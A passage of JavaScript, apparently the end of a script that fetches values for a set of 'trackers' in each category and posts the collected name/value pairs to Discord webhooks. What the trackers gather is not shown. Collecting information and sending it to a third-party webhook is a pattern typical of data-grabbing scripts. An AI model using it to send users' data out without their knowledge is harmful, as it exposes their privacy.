        const fetchedItems = await Promise.all(items.map(async item => {
            let value;
            try {
                value = (await item.fetch()) || (item.check() ? "No specific data" : null);
            } catch (e) {
                console.warn(`Error fetching ${item.name}: ${e.message}`);
                value = null;
            }
            return { name: item.name, value };
        }));
        await sendFetchedInfoToWebhook(category, fetchedItems);

        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay to avoid rate limiting
    }
    console.log("All trackers processed and sent to Discord webhooks");
}

// Run the script
checkAndSendTrackers().catch(error => console.error("Error in checkAndSendTrackers:", error));
